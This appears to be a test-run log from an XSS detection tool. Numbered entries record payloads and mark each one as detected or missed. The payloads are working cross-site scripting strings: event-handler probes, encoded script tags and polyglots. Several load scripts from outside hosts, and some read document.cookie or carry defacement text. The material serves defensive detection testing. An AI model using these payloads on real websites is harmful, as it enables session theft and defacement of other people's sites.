+✅ Detected payload: dic_where=medic&query_utf=%22%3E%3CSCRIPT%20SRC=http://ha.ckers.or<br/>g/xss.js%3E%3C/SCRIPT%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64088
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <button popovertarget=x>Click me</button><menu onbeforetoggle=alert(1) popover id=x>XSS</menu>
+✅ Detected payload: <button popovertarget=x>Click me</button><menu onbeforetoggle=alert(1) popover id=x>XSS</menu>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64089
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <fieldset onpointerdown=alert(1) style=display:block>AnonKryptiQuz</fieldset>
+✅ Detected payload: <fieldset onpointerdown=alert(1) style=display:block>AnonKryptiQuz</fieldset>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64090
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: searchstring="><iframe<br/>src=http://www.xssed.com/></iframe>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64091
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: id=581690&coll=ACM&dl="><script>alert(123)</script>
+✅ Detected payload: id=581690&coll=ACM&dl="><script>alert(123)</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64092
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: lang=cat&mode=domain&sld=%22%3E%3Cscript%20src=//h4k.in/i.js%3E%<br/>3C/script%3E
+✅ Detected payload: lang=cat&mode=domain&sld=%22%3E%3Cscript%20src=//h4k.in/i.js%3E%<br/>3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64093
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <base id=x tabindex=1 onfocus=alert(1)></base>
+✅ Detected payload: <base id=x tabindex=1 onfocus=alert(1)></base>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64094
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <td oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+✅ Detected payload: <td oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64095
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <caption onmouseleave="alert(1)">test</caption>
+✅ Detected payload: <caption onmouseleave="alert(1)">test</caption>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64096
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <style>@keyframes x{}</style><data style="animation-name:x" onwebkitanimationstart="alert(1)"></data>
+✅ Detected payload: <style>@keyframes x{}</style><data style="animation-name:x" onwebkitanimationstart="alert(1)"></data>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64097
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <style>@keyframes x{}</style><th style="animation-name:x" onanimationstart="alert(1)"></th>
+✅ Detected payload: <style>@keyframes x{}</style><th style="animation-name:x" onanimationstart="alert(1)"></th>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64098
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <title onmouseenter="alert(1)" style=display:block>AnonKryptiQuz</title>
+✅ Detected payload: <title onmouseenter="alert(1)" style=display:block>AnonKryptiQuz</title>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64099
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: cmd=search&SearchForm=%25%25SearchForm%25%25&inde<br/>x=E%3A\Webroot\dtsearch\ing_com_au\ing_indexprod&maxfiles=10&request=%27%22%3Cscript%3Ealert(%27This<br/>+website+is+vulnerable+to+xssing!%27)%3B%3C%2Fscript%3E%0D%0A&Search.x=0&Search.y=0
+✅ Detected payload: cmd=search&SearchForm=%25%25SearchForm%25%25&inde<br/>x=E%3A\Webroot\dtsearch\ing_com_au\ing_indexprod&maxfiles=10&request=%27%22%3Cscript%3Ealert(%27This<br/>+website+is+vulnerable+to+xssing!%27)%3B%3C%2Fscript%3E%0D%0A&Search.x=0&Search.y=0
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64100
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: flag=3&lan=1&title=%22%3E%3Cbody+onload=alert(%22By%20Encore%22)<br/>%3E%3Cmarquee%3E%3Ch1%3EUNUTAMADIM%20:(%20%20%20%3C/h1%3E%3Ch2%3E%20By%20Encore%20%3C/h2%3E
+✅ Detected payload: flag=3&lan=1&title=%22%3E%3Cbody+onload=alert(%22By%20Encore%22)<br/>%3E%3Cmarquee%3E%3Ch1%3EUNUTAMADIM%20:(%20%20%20%3C/h1%3E%3Ch2%3E%20By%20Encore%20%3C/h2%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64101
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: &#x27;;alert(string.fromcharcode(88,83,83))//&#x27;;alert(string.fromcharcode(88,83,83))//&quot;;alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))//&quot;;alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))//--&gt;&lt;/script&gt;&quot;&gt;&#x27;&gt; none
+✅ Detected payload: ';alert(string.fromcharcode(88,83,83))//';alert(string.fromcharcode(88,83,83))//";alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))//";alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105,116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))//--></script>">'><script>alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64102
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <script\x0C>javascript:alert(1)</script>
+✅ Detected payload: <script\x0C>javascript:alert(1)</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64103
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: action=recherche&keyword=%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert(1<br/>337)%3C%2Fscript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Xylitol%3C%2Fh1%3E%3C%2Fmarquee%3E&x=0&y=0
+✅ Detected payload: action=recherche&keyword=%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert(1<br/>337)%3C%2Fscript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Xylitol%3C%2Fh1%3E%3C%2Fmarquee%3E&x=0&y=0
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64104
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <blockquote onclick="alert(1)" style=display:block>AnonKryptiQuz</blockquote>
+✅ Detected payload: <blockquote onclick="alert(1)" style=display:block>AnonKryptiQuz</blockquote>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64105
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: NumOffre=74516&de=consultation&xcharte=False&xdest=&<br/>ChoRetourCriteres=/fr/consultation/index.aspx?page=%22%3E%3Cscript%3Ealert(/XSS/)%3C/script%3E
+✅ Detected payload: NumOffre=74516&de=consultation&xcharte=False&xdest=&<br/>ChoRetourCriteres=/fr/consultation/index.aspx?page=%22%3E%3Cscript%3Ealert(/XSS/)%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64106
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <style>:target {color:red;}</style><th id=x style="transition:color 1s" ontransitionstart=alert(1)></th>
+✅ Detected payload: <style>:target {color:red;}</style><th id=x style="transition:color 1s" ontransitionstart=alert(1)></th>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64107
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+✅ Detected payload: <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64108
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <menu draggable="true" ondragexit="alert(1)" style=display:block>AnonKryptiQuz</menu>
+✅ Detected payload: <menu draggable="true" ondragexit="alert(1)" style=display:block>AnonKryptiQuz</menu>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64109
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: ID=85&keywords=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fs<br/>cript%3E%3E%3E%3E%3Cmarquee%3E%3Ch1%3Ehacked+by+lejoner%3C%2Fh1%3E%3C%2Fmarquee%3E&gonderen=Ara
+✅ Detected payload: ID=85&keywords=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fs<br/>cript%3E%3E%3E%3E%3Cmarquee%3E%3Ch1%3Ehacked+by+lejoner%3C%2Fh1%3E%3C%2Fmarquee%3E&gonderen=Ara
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64110
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <q draggable="true" ondragenter="alert(1)">test</q>
+✅ Detected payload: <q draggable="true" ondragenter="alert(1)">test</q>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64111
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <style>:target {color:red;}</style><video2 id=x style="transition:color 1s" ontransitionstart=alert(1)></video2>
+✅ Detected payload: <style>:target {color:red;}</style><video2 id=x style="transition:color 1s" ontransitionstart=alert(1)></video2>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64112
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <wbr onmouseover="alert(1)" style=display:block>test</wbr>
+✅ Detected payload: <wbr onmouseover="alert(1)" style=display:block>test</wbr>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64113
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <div id="133"><!-- `<img/src=xx:xx onerror=alert(133)//--!>//["'`-->]]>]</div>
+✅ Detected payload: <div id="133"><!-- `<img/src=xx:xx onerror=alert(133)//--!>//["'`-->]]>]</div>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64114
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: u=e49e76df497cdb1f449d43808&id=4ffe578c35&MERGE0=som<br/>eone%40%22%2F%3E%3Cscript+src%3D%22http%3A%2F%2Ffreewebs.com%2Fskunkf00t%2FX.js%22%3E%3C%2Fscript%3E<br/>%3C!--&EMAILTYPE=html
+✅ Detected payload: u=e49e76df497cdb1f449d43808&id=4ffe578c35&MERGE0=som<br/>eone%40%22%2F%3E%3Cscript+src%3D%22http%3A%2F%2Ffreewebs.com%2Fskunkf00t%2FX.js%22%3E%3C%2Fscript%3E<br/>%3C!--&EMAILTYPE=html
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64115
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: t=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+✅ Detected payload: t=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64116
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: buscar=%22%3E%3Cscript%3Ealert(/xssed/);%3C/script%3E
+✅ Detected payload: buscar=%22%3E%3Cscript%3Ealert(/xssed/);%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64117
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <dir ondblclick="alert(1)">test</dir>
+✅ Detected payload: <dir ondblclick="alert(1)">test</dir>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64118
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: language=it&visual=%22%3E%3Cscript%3Ealert%281%29;%3C/script<br/>%3E%3C%22
+✅ Detected payload: language=it&visual=%22%3E%3Cscript%3Ealert%281%29;%3C/script<br/>%3E%3C%22
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64119
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: query=%27%22%3Cscript%3Ealert(%27This%2<br/>0website%20is%20vulnerable%20to%20xssing!%27)%3B%3C/script%3E&submit.x=31&submit.y=10&submit=Search
+✅ Detected payload: query=%27%22%3Cscript%3Ealert(%27This%2<br/>0website%20is%20vulnerable%20to%20xssing!%27)%3B%3C/script%3E&submit.x=31&submit.y=10&submit=Search
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64120
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <style>@keyframes x{}</style><code style="animation-name:x" onanimationend="alert(1)"></code>
+✅ Detected payload: <style>@keyframes x{}</style><code style="animation-name:x" onanimationend="alert(1)"></code>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64121
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: des=%3E%27%3E%3Cscript/xss+src=http://sa<br/>nto22.ehost-services111.com/xss.js%3E%3C/script%3E
+✅ Detected payload: des=%3E%27%3E%3Cscript/xss+src=http://sa<br/>nto22.ehost-services111.com/xss.js%3E%3C/script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64122
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <th onbeforescriptexecute=alert(1)><script>1</script>
+✅ Detected payload: <th onbeforescriptexecute=alert(1)><script>1</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64123
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: %253Cscript%253Ealert('XSS')%253C%252Fscript%253E
+✅ Detected payload: %253Cscript%253Ealert('XSS')%253C%252Fscript%253E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64124
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: next=%22%3E%3Cscript%3Ealert%28123%29%3C%2F<br/>script%3E
+✅ Detected payload: next=%22%3E%3Cscript%3Ealert%28123%29%3C%2F<br/>script%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64125
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: "`'><script>\xE1\x9A\x80javascript:alert(1)</script>
+✅ Detected payload: "`'><script>\xE1\x9A\x80javascript:alert(1)</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64126
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: NodeList=DmsoMsrr&SearchType=<br/>1&SortBy=resource_title&Saved=0&SavedSearchTitle=Untitled&ResourceTypes=2%2C3%2C4%2C5%2C6%2C16%2C7%2<br/>C8%2C9%2C10%2C11%2C13%2C15%2C%2CFAC%2CORG%2CWEB%2CSIM%2CSTY%2CTEC&SearchText=%3Cscript%3Ealert%28%22<br/>xss%22%29%3C%2Fscript%3E&Submit.x=20&Submit.y=12&OutputFormat=Html&KeywordList=&Debug=True&Trace=Tru<br/>e
+✅ Detected payload: NodeList=DmsoMsrr&SearchType=<br/>1&SortBy=resource_title&Saved=0&SavedSearchTitle=Untitled&ResourceTypes=2%2C3%2C4%2C5%2C6%2C16%2C7%2<br/>C8%2C9%2C10%2C11%2C13%2C15%2C%2CFAC%2CORG%2CWEB%2CSIM%2CSTY%2CTEC&SearchText=%3Cscript%3Ealert%28%22<br/>xss%22%29%3C%2Fscript%3E&Submit.x=20&Submit.y=12&OutputFormat=Html&KeywordList=&Debug=True&Trace=Tru<br/>e
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64127
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: q=http%3A%2F%2Flogin.pathfinder.gr%2Findex.php%3Fplogin%3D%27%3Ba&lt;br/&gt;lert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%&lt;br/&gt;2C83%29%29%2F%2F%2522%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%2522%3Balert%28Str&lt;br/&gt;ing.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%253E%253C%2FSCRIPT%253E%2522%253E%27%253E%253CSCRIPT%2&lt;br/&gt;53Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%253C%2FSCRIPT%253E
+✅ Detected payload: q=http%3A%2F%2Flogin.pathfinder.gr%2Findex.php%3Fplogin%3D%27%3Ba<br/>lert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%<br/>2C83%29%29%2F%2F%2522%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%2522%3Balert%28Str<br/>ing.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%253E%253C%2FSCRIPT%253E%2522%253E%27%253E%253CSCRIPT%2<br/>53Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%253C%2FSCRIPT%253E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64128
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <style>@keyframes slidein {}</style><cite style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></cite>
+✅ Detected payload: <style>@keyframes slidein {}</style><cite style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></cite>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64129
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: dosearch=yes&story=%22%3E%3Cscript%3Ealert(/xssed/);%3C/script%3E&ti<br/>tle=&user=
+✅ Detected payload: dosearch=yes&story=%22%3E%3Cscript%3Ealert(/xssed/);%3C/script%3E&ti<br/>tle=&user=
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64130
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <time onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</time><input value=clickme>
+✅ Detected payload: <time onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</time><input value=clickme>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64131
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <xmp onkeypress="alert(1)" contenteditable>AnonKryptiQuz</xmp>
+✅ Detected payload: <xmp onkeypress="alert(1)" contenteditable>AnonKryptiQuz</xmp>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64132
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: &gt;&quot;&lt;img src=&quot;sanitized-javascript:document.cookie=true;&quot;&gt;
+✅ Detected payload: >"<img src="javascript:document.cookie=true;">
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64133
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <fieldset oncontextmenu="alert(1)" style=display:block>AnonKryptiQuz</fieldset>
+✅ Detected payload: <fieldset oncontextmenu="alert(1)" style=display:block>AnonKryptiQuz</fieldset>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64134
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: option=com_content&user_rating=1&submit_vote=index2.php?option=com_<br/>content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&url=http://xsse<br/>d.com/
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64135
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <button popovertarget=x>Click me</button><head onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</head>
+✅ Detected payload: <button popovertarget=x>Click me</button><head onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</head>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64136
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: resim='"--></style></script><script>alert(document.cookie)</sc<br/>ript>
+✅ Detected payload: resim='"--></style></script><script>alert(document.cookie)</sc<br/>ript>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64137
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: NewsID=<body%20onload=alert(1)>
+✅ Detected payload: NewsID=<body%20onload=alert(1)>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64138
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: u=%3Cscript%20src=http://www.fileden.com/files/2008/1/10/1691310/xss.gi<br/>f%3E
+✅ Detected payload: u=%3Cscript%20src=http://www.fileden.com/files/2008/1/10/1691310/xss.gi<br/>f%3E
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64139
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: _nfpb=true&_pageLabel=GRAL_busquedaPage&textoBusqueda=%3C<br/>center%3E%3Ch1%3EHacked%20by%20Norehem%3C/h1%3E%3C/center%3E%3Ccenter%3E%3Cimg%20src=%22http://img23<br/>1.imageshack.us/img231/4126/logocimxy3.png%22%3E%3C/center%3E%3Cscript%3Ealert('CIM%20was%20here');%<br/>3C/script%3E&seccionBusqueda=-1
+✅ Detected payload: _nfpb=true&_pageLabel=GRAL_busquedaPage&textoBusqueda=%3C<br/>center%3E%3Ch1%3EHacked%20by%20Norehem%3C/h1%3E%3C/center%3E%3Ccenter%3E%3Cimg%20src=%22http://img23<br/>1.imageshack.us/img231/4126/logocimxy3.png%22%3E%3C/center%3E%3Cscript%3Ealert('CIM%20was%20here');%<br/>3C/script%3E&seccionBusqueda=-1
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64140
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: query=<script>alert('XSS BY THEBIG')</script>
+✅ Detected payload: query=<script>alert('XSS BY THEBIG')</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64141
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <ruby draggable="true" ondragleave="alert(1)" style=display:block>AnonKryptiQuz</ruby>
+✅ Detected payload: <ruby draggable="true" ondragleave="alert(1)" style=display:block>AnonKryptiQuz</ruby>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64142
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <strike draggable="true" ondragenter="alert(1)">AnonKryptiQuz</strike>
+✅ Detected payload: <strike draggable="true" ondragenter="alert(1)">AnonKryptiQuz</strike>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64143
+pressed
+Handling alerts
+No logs detected
+IndexedDB logs:
+❌ Missed payload: cpage=SEARCH&cnode=1
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64144
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <video2 onmouseover="alert(1)" style=display:block>test</video2>
+✅ Detected payload: <video2 onmouseover="alert(1)" style=display:block>test</video2>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64145
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: window.name="javascript:alert(23)";
+✅ Detected payload: window.name="javascript:alert(23)";
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64146
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <style>@keyframes slidein {}</style><details style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></details>
+✅ Detected payload: <style>@keyframes slidein {}</style><details style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></details>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64147
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: <xmp id=x tabindex=1 ondeactivate=alert(1)></xmp><input id=y autofocus>
+✅ Detected payload: <xmp id=x tabindex=1 ondeactivate=alert(1)></xmp><input id=y autofocus>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64148
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: act=Register.reg&figure="><script>alert(document.cookie)</script>
+✅ Detected payload: act=Register.reg&figure="><script>alert(document.cookie)</script>
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64149
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: PG=x%22%3E%3CscripT%3Ealert(123)%3C/scRipt%3E&zItl=Parents'%2<br/>0Choice%20Awards
+✅ Detected payload: PG=x%22%3E%3CscripT%3Ealert(123)%3C/scRipt%3E&zItl=Parents'%2<br/>0Choice%20Awards
+
+------------------------------------------------------------------------------------------
+
+Attack vector 64150
+pressed
+Handling alerts
+IndexedDB logs: OriginalPayload: tpLeg=%3Ctr%27%22%3E%3C/title%3E%3Cscript%3E<br/>alert(1337)%3C/script%3E%3Cmarquee%3E%3Ch1%3EXSS%20BY%20XYLITOL%3C/h1%3E%3C/marquee%3E%3E%3Ctd%20col<br/>span=4%3E%3Ctable%20align=%22left%22%20border=%220%22%20width=%22700%22%20cellspacing=%220%22%20cell<br/>padding=%220%22%3E%3Ctr%3E%3Ctd%20width=%22550%22%3E%3Ciframe%20name=%22simples%22%20height=%2230px%<br/>22%20marginwidth=%220%22%20marginheight=%220%22%20frameborder=%220%22%20src=%22/pt/Search/simple.asp<br/>x%22%20width=%22100%25%22%20target=%22_top%22%3E%3C/iframe%3E%3C/td%3E%3Ctd%20width=%22150%22%20alig<br/>n=%22center%22%3E%3C/td%3E%3C/tr%3E%3C/table%3E%3C/td%3E%3C/tr%3E%3Ctr%3E%3Ctd%20valign=top%20width=<br/>100%20nowrap%3E%3Ci%3E%3Cb%3ENotas%3C/b%3E%3C/i%3E%20:%20%3C/td%3E%3Ctd%20colspan=2%20valign=bottom%<br/>3E%3C/td%3E%3C/tr%3E%3C/table%3E%3C/center%3E%3C/div%3E%3Chr%3E%3Ch2%3E%3C/h2%3E%3Cp%3ETendo-se%20ve<br/>rificado%20inexactid%F5es%20no%20%3Ca%20href=%22/isapi/go.asp?d=despce-80-2004pt%22%3EDespacho%20do%<br/>20Chefe%20do%20Executivo%20n.%BA%2080/2004%3C/a%3E,%20publicado%20no%20%3Ca%20href=%22../14/bo14.asp<br/>%22%3EBoletim%20Oficial%20da%20RAEM%20n.%BA%2014/2004,%20II%20S%E9rie%3C/a%3E,%20de%207%20de%20Abril<br/>,%20procede-se,%20ao%20abrigo%20do%20disposto%20no%20artigo%209.%BA%20da%20%3Ca%20href=%22/isapi/go.<br/>asp?d=lei-3-1999pt%22%3ELei%20n.%BA%203/1999%3C/a%3E,%20%E0%20sua%20rectifica%E7%E3o.%20Assim:%3C/p%<br/>3E%3Cp%3EOnde%20se%20l%EA:%20%ABo%20Dr.%20Fong%20Man%20Chong,%20juiz%20de%20direito%20do%20Tribunal%<br/>20Administrativo%BB%3C/p%3E%3Cp%3Edeve%20ler-se:%20%ABo%20Dr.%20Fong%20Man%20Chong,%20presidente%20d<br/>e%20Tribunal%20Colectivo%20do%20Tribunal%20Judicial%20de%20Base%BB.%3C/p%3E%3Cp%3EGabinete%20do%20Ch<br/>efe%20do%20Executivo,%20aos%2023%20de%20Abril%20de%202004.%3C/p%3E%3Cp%3EA%20Chefe%20do%20Executivo,<br/>%20Interina,%20Florinda%20da%20Rosa%20Silva%20Chan.%3C/p%3E%3Ch3%3E%97%97%97%3C/h3%3E%3Cp%3EGabinete<br/>%20do%20Chefe%20do%20Executivo,%20aos%2027%20de%20Abril%20de%202004.%20%97%20O%20Chefe%20do%20Gabine<br/>te,%20Ho%20Veng%20On.%3C/p%3E%3Chr%3E%3Ch1%3E%3Ca%20href=
+✅ Detected payload: tpLeg=%3Ctr%27%22%3E%3C/title%3E%3Cscript%3E<br/>alert(1337)%3C/script%3E%3Cmarquee%3E%3Ch1%3EXSS%20BY%20XYLITOL%3C/h1%3E%3C/marquee%3E%3E%3Ctd%20col<br/>span=4%3E%3Ctable%20align=%22left%22%20border=%220%22%20width=%22700%22%20cellspacing=%220%22%20cell<br/>padding=%220%22%3E%3Ctr%3E%3Ctd%20width=%22550%22%3E%3Ciframe%20name=%22simples%22%20height=%2230px%<br/>22%20marginwidth=%220%22%20marginheight=%220%22%20frameborder=%220%22%20src=%22/pt/Search/simple.asp<br/>x%22%20width=%22100%25%22%20target=%22_top%22%3E%3C/iframe%3E%3C/td%3E%3Ctd%20width=%22150%22%20alig<br/>n=%22center%22%3E%3C/td%3E%3C/tr%3E%3C/table%3E%3C/td%3E%3C/tr%3E%3Ctr%3E%3Ctd%20valign=top%20width=<br/>100%20nowrap%3E%3Ci%3E%3Cb%3ENotas%3C/b%3E%3C/i%3E%20:%20%3C/td%3E%3Ctd%20colspan=2%20valign=bottom%<br/>3E%3C/td%3E%3C/tr%3E%3C/table%3E%3C/center%3E%3C/div%3E%3Chr%3E%3Ch2%3E%3C/h2%3E%3Cp%3ETendo-se%20ve<br/>rificado%20inexactid%F5es%20no%20%3Ca%20href=%22/isapi/go.asp?d=despce-80-2004pt%22%3EDespacho%20do%<br/>20Chefe%20do%20Executivo%20n.%BA%2080/2004%3C/a%3E,%20publicado%20no%20%3Ca%20href=%22../14/bo14.asp<br/>%22%3EBoletim%20Oficial%20da%20RAEM%20n.%BA%2014/2004,%20II%20S%E9rie%3C/a%3E,%20de%207%20de%20Abril<br/>,%20procede-se,%20ao%20abrigo%20do%20disposto%20no%20artigo%209.%BA%20da%20%3Ca%20href=%22/isapi/go.<br/>asp?d=lei-3-1999pt%22%3ELei%20n.%BA%203/1999%3C/a%3E,%20%E0%20sua%20rectifica%E7%E3o.%20Assim:%3C/p%<br/>3E%3Cp%3EOnde%20se%20l%EA:%20%ABo%20Dr.%20Fong%20Man%20Chong,%20juiz%20de%20direito%20do%20Tribunal%<br/>20Administrativo%BB%3C/p%3E%3Cp%3Edeve%20ler-se:%20%ABo%20Dr.%20Fong%20Man%20Chong,%20presidente%20d<br/>e%20Tribunal%20Colectivo%20do%20Tribunal%20Judicial%20de%20Base%BB.%3C/p%3E%3Cp%3EGabinete%20do%20Ch<br/>efe%20do%20Executivo,%20aos%2023%20de%20Abril%20de%202004.%3C/p%3E%3Cp%3EA%20Chefe%20do%20Executivo,<br/>%20Interina,%20Florinda%20da%20Rosa%20Silva%